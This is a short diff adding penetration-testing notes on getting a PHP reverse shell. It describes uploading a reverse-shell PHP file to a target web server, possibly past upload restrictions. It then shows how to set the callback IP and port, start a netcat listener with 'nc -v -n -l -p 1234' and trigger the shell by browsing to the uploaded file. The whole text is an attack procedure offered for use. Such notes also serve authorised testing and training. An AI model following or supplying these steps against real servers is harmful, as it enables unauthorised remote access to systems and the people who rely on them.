@@ -1,0 +1,19 @@
+Creating a PHP reverse shell
+
+Use 'PHP Reverse Shell.php'
+
+Upload the file to the server, possibly utilising techniques detailed in the 'Bypassing File Upload Restrictions'
+manual
+
+Change settings in the PHP file:
+
+$ip = '127.0.0.1';
+$port = 1234;       
+
+Create a listener:
+
+nc -v -n -l -p 1234
+
+To run the shell, navigate to the website that you are targeting, adding '/php-reverse-shell' after the main address.
+
+You should now have a session in the listener
